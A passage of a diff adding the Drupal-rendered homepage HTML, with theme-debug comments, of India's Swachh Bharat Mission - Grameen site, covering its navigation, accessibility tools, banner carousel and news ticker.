@@ -1,0 +1,1636 @@
+
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'html' -->
+<!-- FILE NAME SUGGESTIONS:
+   * html--front.html.twig
+   * html--node.html.twig
+   x html.html.twig
+-->
+<!-- BEGIN OUTPUT from 'themes/custom/repo-theme-master/templates/system/html.html.twig' -->
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8" />
+<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
+<meta name="MobileOptimized" content="width" />
+<meta name="HandheldFriendly" content="true" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="icon" href="/themes/custom/repo-theme-master/favicon.ico" type="image/vnd.microsoft.icon" />
+
+    
+	<title>Home | Swachh Bharat Mission - Grameen</title>
+    <link rel="stylesheet" media="all" href="/core/modules/system/css/components/ajax-progress.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/align.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/autocomplete-loading.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/fieldgroup.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/container-inline.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/clearfix.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/details.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/hidden.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/item-list.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/js.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/nowrap.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/position-container.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/progress.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/reset-appearance.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/resize.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/sticky-header.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/system-status-counter.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/system-status-report-counters.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/system-status-report-general-info.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/tabledrag.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/tablesort.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/system/css/components/tree-child.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/core/modules/views/css/views.module.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/modules/contrib/view_marquee/css/style.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/style.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/bootstrap.min.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/jquery.dataTables.min.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/menu_css.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/site.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/site-responsive.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/social.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/base.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/solid.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/fontawesome.css?tgo71z" />
+<link rel="stylesheet" media="all" href="/themes/custom/repo-theme-master/css/flipdown.css?tgo71z" />
+
+    <script src="/themes/custom/repo-theme-master/js/bundle.js?tgo71z"></script>
+<script src="/themes/custom/repo-theme-master/js/framework.js?tgo71z"></script>
+<script src="/themes/custom/repo-theme-master/js/jquery.min.js?tgo71z"></script>
+<script src="/themes/custom/repo-theme-master/js/menu_script.js?tgo71z"></script>
+<script src="/themes/custom/repo-theme-master/js/swithcer.js?tgo71z"></script>
+<script src="/themes/custom/repo-theme-master/js/flipdown.js?tgo71z"></script>
+
+    <link id="dynamic-stylesheet" rel="stylesheet" href="">
+    <link rel="apple-touch-icon" href="https://swachhbharatmission.ddws.gov.in//themes/custom/repo-theme-master/images/favicon/apple-touch-icon.png">
+    <link rel="icon" href="https://swachhbharatmission.ddws.gov.in//themes/custom/repo-theme-master/images/favicon/favicon.png">
+    
+       
+        
+  </head>
+  <body class="page-user">
+     <input type="hidden" name="base_url" value="https://swachhbharatmission.ddws.gov.in/" id="base_url" /> 
+    
+    
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'off_canvas_page_wrapper' -->
+<!-- BEGIN OUTPUT from 'core/modules/system/templates/off-canvas-page-wrapper.html.twig' -->
+  <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
+    
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'page' -->
+<!-- FILE NAME SUGGESTIONS:
+   x page--front.html.twig
+   * page--node.html.twig
+   * page.html.twig
+-->
+<!-- BEGIN OUTPUT from 'themes/custom/repo-theme-master/templates/layout/page--front.html.twig' -->
+<header>
+<div class="main_head">
+  <div class="region region-header-top">
+    <div id="block-cmf-content-header-region-block" class="block block-cmf-content first last odd">
+      <div class="wrapper common-wrapper" style="background-color: #ebebeb;border: 0px solid #ebebeb;">
+        <div class="container four_content top-header">
+          <div class="common-left clearfix">
+            <ul>
+              <li class="gov-india d-none d-sm-block"><span class="responsive_go_hindi" lang="hi">
+			    <a target="_blank"
+                    href="https://india.gov.in/hi"                    
+                    rel="noopener noreferrer">
+                    भारत सरकार
+                </a>
+				</span>
+			  </li>
+					
+			
+            <li class="ministry"><span class="li_eng responsive_go_eng"><a target="_blank"
+                href="https://india.gov.in/"               
+                rel="noopener noreferrer">
+                Government of India
+                </a></span>
+			</li>
+            </ul>
+          </div>
+          <div class="common-right clearfix">
+            <ul id="header-nav">
+              <!--<li class="ico-skip cf"><a href="#skipCont "target="_self" title="main content">Skip to main content</a>
+              </li>-->
+			 
+
+
+	<li class="ico-skip cf" role="presentation">
+    <a href="#skipCont" target="_self" title="main content">Skip to main content</a>
+  </li>
+
+
+              <li class="ico-site-search cf">
+
+                <div class="search-drop both-search">
+                  <div class="google-find">
+                    <form method="get" action="http://www.google.com/search" target="_blank">
+                      <label for="search_key_g" class="notdisplay">Search</label>
+                      <input type="text" name="q" value="" id="search_key_g" />
+                      <input type="submit" value="Search" class="submit" />
+                      <div>
+                        <input type="radio" name="sitesearch" value="" id="the_web" />
+                        <label for="the_web">The Web</label>
+                        <input type="radio" name="sitesearch" value="india.gov.in" checked id="the_domain" /> <label
+                          for="the_domain"> INDIA.GOV.IN</label>
+                      </div>
+                    </form>
+                  </div>
+
+                </div>
+              </li>
+
+                           
+			  <!-- assability code start -->
+
+                       <li>
+                            <span class="outline-right user_accessibility">
+                                
+                                <span class="accessibility" role="button" tabindex="0" aria-expanded="false" aria-label="Open accessibility tools">
+                            <i class="">
+							  <img src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/accessibility.svg" alt="accessibility" style="margin-top: 7px;"></i>
+                                </span>
+                                
+                               
+								<div class="access-type" aria-hidden="true" style="display: none;" id="accessibility-popup" role="dialog" aria-modal="true" aria-label="Accessbility Tools" aria-haspopup="dialog">
+                                  
+                                    <div class="tool-title" role="heading" aria-level="2">Accessibility Tools</div>
+                                    <span class="close-accessbility" tabindex="0" role="button" aria-label="Close accessibility tools">x</span>
+                                     
+                                <fieldset class="tool-group">
+								<div class="tool-name"><legend>Color Adjustment</legend> <i class="fas fa-minus"></i></div>
+
+										<div class="tool-item" role="group" aria-label="Contrast options">
+                                        <button type="button" id="removeStylesheet" aria-pressed="true" class="hight-contrast color-standard green greena">
+                                            <i><i class="fas fa-sun"></i></i> High Contrast
+                                        </button>
+                                        <button type="button" id="addStylesheet" aria-label="Dark Contrast" class="dark-contrast color-dark" aria-pressed="false">
+                                            <i><i class="fas fa-moon"></i></i> Dark Contrast
+                                        </button>
+									</div>
+
+								</fieldset>
+										
+										<fieldset class="tool-group">
+										
+                                        <div class="tool-name"><legend>Text Size</legend><i class="fas fa-minus"></i></div>
+                                        
+                                        <div class="tool-item" aria-label="Text size controls">
+                                          
+                                            <button aria-label="Increase font size" class="increase-text changer" id="increasetext1" title="Increase Text">
+                                                <span class="">A<sup>+</sup></span><br>
+                                                Increase <br> Text
+                                                <div id="fontAnnouncement" role="status" aria-live="polite" style="position:absolute; left:-9999px;"></div>
+                                            </button>
+                                            <button aria-label="Decrease font size" class="decrease-text changer" id="decreasetext" title="Decrease Text">
+                                                <span class="">A<sup>-</sup></span> <br>
+                                                Decrease Text
+                                            </button>
+                                            <button aria-label="Reset font size" class="reset changer text-changer" id="resettext" title="Reset Text"><i class="fas fa-sync"></i> Reset Text</button>
+                                        </div>
+										 </fieldset>																				 
+										 <fieldset class="tool-group">
+										 <div class="tool-name"><legend>Screen Reader</legend><i class="fas fa-minus"></i></div>
+                                        <div class="tool-item">
+                                            <a href="https://swachhbharatmission.ddws.gov.in/screenreader" target="_blank" class="scr-reader" title="Screen Reader" style="width: auto;" aria-label="Open screen reader page"><i class="fas fa-tablet-alt"></i> Screen Reader</a>
+                                        </div>										
+										</fieldset>                                    
+                                </div>
+                            </span>
+                        </li>
+                        <!-- assability code end -->
+
+              
+			  
+			 
+			    <li>
+                <a id="toggleAccessibility"
+   href="https://www.facebook.com/SBMGramin"
+   title="Visit our Facebook page (opens in a new window)"
+   target="_blank"
+   rel="noopener noreferrer">
+   <img class="top" src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/fb.png" alt="Facebook">
+</a>
+               
+              </li>
+
+			  <li>
+                <a
+   href="https://x.com/swachhbharat" 
+   id="toggleAccessibility" 
+   title="Visit our Twitter page (opens in a new window)"
+   target="_blank" 
+   rel="noopener noreferrer">
+   <img class="top" src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/Twitter-Logо_png.png" 
+        alt="Twitter">
+</a>
+               
+              </li>
+			  
+			  			  <li>
+                <a id="toggleAccessibility"  style="display: flex;
+    align-items: center;
+    justify-content: center;"
+   href="https://www.youtube.com/@SwachhBharatMissionGramin" 
+   title="Visit the Swachh Bharat Mission Gramin YouTube channel" 
+   target="_blank" 
+   rel="noopener noreferrer">
+   <img class="top" 
+        src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/you-tube.png" 
+        alt="YouTube" style="max-width:36px;">
+</a>
+               
+              </li>
+			  <li >
+                  <a id="toggleAccessibility" 
+   href="https://www.instagram.com/swachhbharatgrameen/?hl=en" 
+   title="Visit the Swachh Bharat Grameen Instagram page" 
+   target="_blank" 
+   rel="noopener noreferrer">
+   <img class="top" 
+        src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/insta1.png" 
+        alt="Instagram">
+</a>
+               
+              </li>
+			
+			  
+              <li class="ico-sitemap cf">
+                <a href="" title="Sitemap">
+                  <img class="top" src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/ico-sitemap.png"
+                    alt="Sitemap" /></a>
+              </li>
+
+              
+
+              
+
+
+
+
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+    <p id="scroll" style="display: none;"><span></span></p>
+  </div>
+  <!--Top-Header Section end-->
+
+  
+    
+            <section class="wrapper header-wrapper"
+              style="padding: 8px 0px;">
+              <div class="container four_content  header-container pt-2">
+                <span class="logo" role="presentation">
+                  <a href="https://swachhbharatmission.ddws.gov.in/" rel="home" class="header_logo" id="logo">
+                    <img class="national_emblem"
+                      src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/national_emblem.svg"
+                      alt="national emblem" style="width: 77px;">
+
+
+
+                                        <h1 style="margin-bottom:0px;">
+                      <span style="font-size:15px;font-weight:900;" lang="hi"> जल शक्ति मंत्रालय  / </span>
+                      <span style="font-size:15px;font-weight:900;" lang="hi"> पेयजल और स्&zwj;वच्&zwj;छता विभाग</span>
+                      <span style="font-size:15px;text-transform:uppercase;font-weight:700;"  lang="en"> Ministry of Jal Shakti /</span>
+                      <span style="font-size:15px;text-transform:uppercase;font-weight:700;" lang="en"> Department of Drinking Water &amp; Sanitation</span>
+
+                    </h1>
+                  </a>
+                </span>
+                <div class="header-right clearfix">
+                  <div class="right-content clearfix">
+                    
+                    <div class="float-element">
+                       <img src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/iyc_logo_horizontal_e-w-tagline.jpg" alt="International Year of Cooperatives logo" class="INC_logo" tabindex="0">
+                      <a target="_blank" tabindex="0" href="https://swachhbharatmission.ddws.gov.in/"
+                        title="Swachh Bharat, External link that open in a new windows"
+                        style="" tabindex="0">
+                        <img src="https://swachhbharatmission.ddws.gov.in/themes/custom/repo-theme-master/images/swach-bharat.png"
+                          alt="Swachh Bharat Mission logo" class="sw-logo">
+                      </a>
+                    </div>
+                                      </div>
+                </div>
+              </div>
+            </section>
+            <!-- menu code start -->
+            
+
+            <div class="main_header_area animated">
+              <div class="container">
+                <nav class="navbar navbar-expand-lg navbar-light">
+                  <div class="container-fluid">
+
+                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
+                      aria-expanded="false" aria-label="Toggle navigation">
+                      <span class="navbar-toggler-icon"></span>
+                    </button>
+                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                      <ul class="navbar-nav me-auto mb-2 mb-lg-0" role="menubar">
+					  
+                        <li class="nav-item" role="none">
+                          <a class="nav-link active" aria-current="page" role="menuitem" href="https://swachhbharatmission.ddws.gov.in/">Home</a>
+                        </li>
+                        <li class="nav-item" role="none">
+                         
+						  <a class="nav-link" href="about_sbm" role="menuitem">About</a>
+						  
+                        </li>
+						
+                        <li class="nav-item dropdown" role="none"">
+                          <a class="nav-link dropdown-toggle" href="javascript:void(0)"  role="menuitem" aria-haspopup="true" aria-expanded="false" id="documentsDropdown" data-bs-toggle="dropdown"> Documents </a>
+						  
+                          <ul class="dropdown-menu" aria-labelledby="documentsDropdown" role="menu">
+                            <li role="none"><a class="dropdown-item" href="guidelines" role="menuitem">Guidelines</a></li>
+                            <li role="none"><a class="dropdown-item" href="technical-notes" role="menuitem">Technical Notes / Manual</a></li>
+							                            <li role="none"><a class="dropdown-item" href="studies-and-surveys" role="menuitem">Studies and Surveys</a></li>
+                                                        <li role="none"><a role="menuitem" class="dropdown-item"
+                                href="https://www.jalshakti-ddws.gov.in/documents/reports/circulars-AOzITNtQWa"
+                                target="_blank" rel="noopener">Letters/Circulars</a></li>
+
+                          </ul>
+                        </li>
+						
+						
+                        <li class="nav-item dropdown" role="none">
+                          
+						  <a class="nav-link dropdown-toggle" href="javascript:void(0)"  role="menuitem" aria-haspopup="true" aria-expanded="false" id="documentsDropdown" data-bs-toggle="dropdown"> Media Corner </a>
+                          <ul class="dropdown-menu" aria-labelledby="navbarDropdown" role="menu">
+                            <li role="none"><a class="dropdown-item" href="press-releases" role="menuitem">Press Releases</a></li>
+                            <li role="none"><a class="dropdown-item" href="communication-material" role="menuitem">Communication Material</a></li>
+                            <li role="none"><a class="dropdown-item" href="swachhata-samachar" role="menuitem">Swachhata Samachar</a></li>
+                            <li role="none"><a class="dropdown-item" href="social-media" role="menuitem">Social Media</a></li>
+							<li role="none"><a class="dropdown-item" href="SSG-2025" role="menuitem">SSG-2025</a></li>
+                          </ul>
+                        </li>
+                        <li role="none" class="nav-item dropdown">
+						 <a class="nav-link dropdown-toggle" href="javascript:void(0)"  role="menuitem" aria-haspopup="true" aria-expanded="false" id="documentsDropdown" data-bs-toggle="dropdown">  Citizen Corner </a>
+                         
+                          <ul class="dropdown-menu" role="menu" >
+                            <li role="none"><a class="dropdown-item" href="faq" role="menuitem">FAQs</a></li>
+                            <li role="none"><a class="dropdown-item" href="https://sbm.gov.in/sbm_dbt/secure/login.aspx" role="menuitem">Application
+                                Form for IHHL</a></li>
+                            <li role="none"><a class="dropdown-item" href="https://jalshakti-ddws.gov.in/en" target="_blank" role="menuitem">Citizen’s Charter</a></li>
+                            <li role="none"><a class="dropdown-item" href="https://ejalshakti.gov.in/ISC/Login.aspx" role="menuitem">Grievance
+                                Redressal</a></li>
+                            <li role="none" class="dropdown"><a class="nav-link dropdown-item dropdown-toggle" href="javascript:void(0)">Corporate social responsibility</a>
+                              <ul class="submenu dropdown-menu" role="menu">
+                                <li role="none"><a role="menuitem" class="dropdown-item"
+                                    href="https://swachhbharatmission.ddws.gov.in/sites/default/files/home-header-attachment/Guide_Line_Sanitation_CSR.pdf"
+                                    target="_blank" role="menuitem"> CSR Guidelines for Sanitation</a></li>
+                                <li role="none"><a role="menuitem" class="dropdown-item"
+                                    href="https://swachhbharatmission.ddws.gov.in/sites/default/files/home-header-attachment/Empanelled_List_of_NGOs.pdf"
+                                    target="_blank" role="menuitem"> Empanelled List of NGOs for undertaking CSR projects</a></li>
+                                <li role="none"><a role="menuitem" class="dropdown-item"
+                                    href="https://swachhbharatmission.ddws.gov.in/sites/default/files/home-header-attachment/Implementation_of_CSR_Projects.pdf"
+                                    target="_blank" role="menuitem">Implementation of CSR projects in the states</a></li>
+                              </ul>
+                            </li>
+                          </ul>
+                        </li>
+                        <li class="nav-item" role="none">
+                          <a role="menuitem" class="nav-link" href="https://sbm.gov.in/sbmgdashboard/statesdashboard.aspx"
+                            target="_blank">Dashboard</a>
+                        </li>
+						
+                      </ul>
+                    </div>
+                  </div>
+                </nav>
+              </div>
+            </div>
+              
+  <!-- menu code end -->
+</div>
+
+</header>
+<main>
+<div class="slide" id="skipCont">
+<div class="row">
+  <div class="col-xxl-12 col-lg-12 col-md-12 col-sm-12 slides p-0 m-0">
+  <section class="carousel" aria-roledescription="carousel" aria-label="Highlighted television shows">
+<div class="carousel-inner">
+  <div class="controls">
+
+    <!-- PLAY / PAUSE -->
+    <button type="button"
+      class="rotation play"
+      aria-label="Stop automatic slide show">
+
+      <svg width="42" height="34" viewBox="0 0 42 34">
+        <rect class="background" x="2" y="2" rx="5" ry="5" width="38" height="24"></rect>
+
+        <!-- PAUSE -->
+        <rect class="icon-pause" x="15" y="8" width="4" height="12"></rect>
+        <rect class="icon-pause" x="23" y="8" width="4" height="12"></rect>
+
+        <!-- PLAY -->
+        <polygon class="icon-play" points="16 8 16 20 28 14"></polygon>
+      </svg>
+    </button>
+
+    <!-- PREVIOUS -->
+    <button type="button" class="previous" aria-label="Previous slide">
+      <svg width="42" height="34">
+        <rect class="background" x="2" y="2" rx="5" ry="5" width="38" height="24"/>
+        <polygon points="22 8 10 14 22 20"/>
+      </svg>
+    </button>
+
+    <!-- NEXT -->
+    <button type="button" class="next" aria-label="Next slide">
+      <svg width="42" height="34">
+        <rect class="background" x="2" y="2" rx="5" ry="5" width="38" height="24"/>
+        <polygon points="20 8 32 14 20 20"/>
+      </svg>
+    </button>
+
+  </div>
+
+   <!-- SLIDES -->
+  <div class="carousel-items" aria-live="off">
+  
+	   <div class="carousel-item active"
+		  role="group"
+		  aria-roledescription="slide"
+		  aria-label="3 of 11">
+		 <img src="themes/custom/repo-theme-master/images/SGSJ_banner.jpg" class="d-block w-100" alt="SGSJ banner">
+		</div>
+  
+	 <div class="carousel-item"
+		  role="group"
+		  aria-roledescription="slide"
+		  aria-label="1 of 11">
+		<a href="https://bharatinnovates.in/" target="_blank">
+			  <img src="themes/custom/repo-theme-master/images/Bharat_innovates_banner.jpg" class="d-block w-100" alt="Bharat innovates banner">
+		</a>	 
+	 </div>
+
+    
+
+    <div class="carousel-item"
+      role="group"
+      aria-roledescription="slide"
+      aria-label="2 of 11">
+      <a href="https://ejalshakti.gov.in/iwc_2026" target="_blank"> 
+	      <img src="themes/custom/repo-theme-master/images/InterNational_wash.jpg" class="d-block w-100" alt="InterNational Wash">
+		 </a>
+    </div>
+
+    <div class="carousel-item"
+      role="group"
+      aria-roledescription="slide"
+      aria-label="3 of 11">
+     <img src="themes/custom/repo-theme-master/images/Samvidhan_Diwas_2025.png" class="d-block w-100" alt="Samvidhan Diwas">
+    </div>
+
+        <div class="carousel-item"
+      role="group"
+      aria-roledescription="slide"
+      aria-label="4 of 11">
+     <a href="https://www.vandemataram150.in/" target="_blank"> 
+	      <img src="themes/custom/repo-theme-master/images/vande_mataram_banner.jpg" class="d-block w-100" alt="vande_mataram">
+		 </a>
+    </div>
+
+           
+
+            <div class="carousel-item"
+      role="group"
+      aria-roledescription="slide"
+      aria-label="6 of 11">
+    <img src="themes/custom/repo-theme-master/images/Sanchar-Saathi-porta.jpg" class="d-block w-100" alt="HSHS_campaign">
+    </div>
+
+            <div class="carousel-item"
+      role="group"
+      aria-roledescription="slide"
+      aria-label="7 of 11">
+    <a href="https://whatsapp.com/channel/0029Vb2r0pw0G0Xbrwoafq3T/116" target="_blank"> 
+         <img src="themes/custom/repo-theme-master/images/Channel_WaSH_banner.jpg" class="d-block w-100" alt="HSHS_campaign">
+        </a>
+    </div>
+
+           <!-- <div class="carousel-item"
+      role="group"
+      aria-roledescription="slide"
+      aria-label="8 of 11">
+    <img src="themes/custom/repo-theme-master/images/poster_contest_banner.jpg" class="d-block w-100" alt="HSHS_campaign">
+    </div>-->
+
+            <div class="carousel-item"
+      role="group"
+      aria-roledescription="slide"
+      aria-label="9 of 11">
+   <a href="javascript:void(0);" target="_blank" > 
+         <img src="themes/custom/repo-theme-master/images/GWM_Banner.png" class="d-block w-100" alt="GWM Banner">
+       </a>
+    </div>
+
+            <div class="carousel-item"
+      role="group"
+      aria-roledescription="slide"
+      aria-label="10 of 11">
+    <a href="javascript:void(0);" target="_blank" > 
+          <img src="themes/custom/repo-theme-master/images/SWM_Banner.png" class="d-block w-100" alt="solid waste management">
+        </a>
+    </div>
+
+
+            <div class="carousel-item"
+      role="group"
+      aria-roledescription="slide"
+      aria-label="11 of 11">
+     <a href="javascript:void(0);" target="_blank">
+			 <img src="themes/custom/repo-theme-master/images/ODF_Plus_(Model)_Banner.png" class="d-block w-100" alt="ODF Plus (Model) Banner">
+			 </a>
+    </div>
+
+
+    
+  </div>
+  </div>
+  </section>
+  </div> 
+</div>
+</div>
+
+
+<!-- slider code end -->
+
+
+
+    <!--marque code start-->
+
+
+    <!--marque code start-->
+
+
+    <div class="ticker">
+        <div class="news-title pt-2">
+
+            <h2 class="sbmheading5 text-white">What's New</h2>
+                    </div>
+
+        
+        <div class="news" role="region"     aria-live="polite"     aria-atomic="false"     aria-label="What's New">
+
+    <button class="marquee-toggle" aria-label="Pause"> <i class="fa fa-pause"></i> </button>
+	
+    <a target="_blank" id="marqueeContent">
+        
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'container' -->
+<!-- BEGIN OUTPUT from 'core/modules/system/templates/container.html.twig' -->
+<div class="views-element-container">
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view.html.twig' -->
+<div class="js-view-dom-id-b6679aafa9e79f47395247039f83dc1e6b34a3600dd4f8ea9daafa684a1ccd84">
+  
+  
+  
+
+  
+  
+  
+
+  
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_view_marquee' -->
+<!-- BEGIN OUTPUT from 'modules/contrib/view_marquee/templates/views-view-view-marquee.html.twig' -->
+
+<div class="views-view-marquee marquee-direction-left">
+  <marquee direction=left behavior=scroll scrollamount=5px scrolldelay=1 >
+          <div class=marquee-row>
+      
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_fields' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+<div class="views-field views-field-nothing"><span class="field-content">
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_field' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+<ul>
+        <li> <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Swachhata-Samachar-Hindi/Swachhata-Samachar_March%282026%29_Hindi.pdf" target="_blank">Swachhata Samachar March (2026) Hindi</a>  </li>
+
+</ul>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+
+</span></div>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+
+
+      </div>
+          <div class=marquee-row>
+      
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_fields' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+<div class="views-field views-field-nothing"><span class="field-content">
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_field' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+<ul>
+        <li> <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Swachhata-Samachar-PDf-English/Swachhata-Samachar_March%282026%29_English.pdf" target="_blank">Swachhata Samachar March (2026) English</a>  </li>
+
+</ul>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+
+</span></div>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+
+
+      </div>
+          <div class=marquee-row>
+      
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_fields' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+<div class="views-field views-field-nothing"><span class="field-content">
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_field' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+<ul>
+        <li> <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/What&#039;s-New-file/SWM_Rules_2026.pdf" target="_blank">SWM Rules, 2026</a>  </li>
+
+</ul>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+
+</span></div>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+
+
+      </div>
+          <div class=marquee-row>
+      
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_fields' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+<div class="views-field views-field-nothing"><span class="field-content">
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_field' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+<ul>
+        <li> <a href="https://ejalshakti.gov.in/iwc_2026" target="_blank">International WASH Conference 2026</a>  </li>
+
+</ul>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+
+</span></div>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+
+
+      </div>
+          <div class=marquee-row>
+      
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_fields' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+<div class="views-field views-field-nothing"><span class="field-content">
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_field' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+<ul>
+        <li> <a href="https://ssg2025.in/" target="_blank">SWACHH SURVEKSHAN GRAMEEN 2025</a>  </li>
+
+</ul>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+
+</span></div>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+
+
+      </div>
+          <div class=marquee-row>
+      
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_fields' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+<div class="views-field views-field-nothing"><span class="field-content">
+
+<!-- THEME DEBUG -->
+<!-- THEME HOOK: 'views_view_field' -->
+<!-- BEGIN OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+<ul>
+        <li> <a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/What&#039;s-New-file/High_Res_GTCS.pdf" target="_blank">Ripples of change Gender-transformative rural WASH programmes</a>  </li>
+
+</ul>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-field.html.twig' -->
+
+</span></div>
+<!-- END OUTPUT from 'core/modules/views/templates/views-view-fields.html.twig' -->
+
+
+      </div>
+      </marquee>
+</div>
+
+<!-- END OUTPUT from 'modules/contrib/view_marquee/templates/views-view-view-marquee.html.twig' -->
+
+
+    
+
+  
+  
+
+  
+  
+</div>
+
+<!-- END OUTPUT from 'core/modules/views/templates/views-view.html.twig' -->
+
+</div>
+
+<!-- END OUTPUT from 'core/modules/system/templates/container.html.twig' -->
+
+
+    </a>
+</div>
+
+    </div>
+<!-- <div class="marquee-container">
+  <div class="marquee-content">
+    <ul>
+      <li><a href="https://swachhbharatmission.ddws.gov.in/sites/default/files/Swachhata-Samachar-E-book/Swachhata_Samachar_January_2025(Hindi)/index.html" target="_blank">Swachhata Samachar January 2025(Hindi)</a></li>
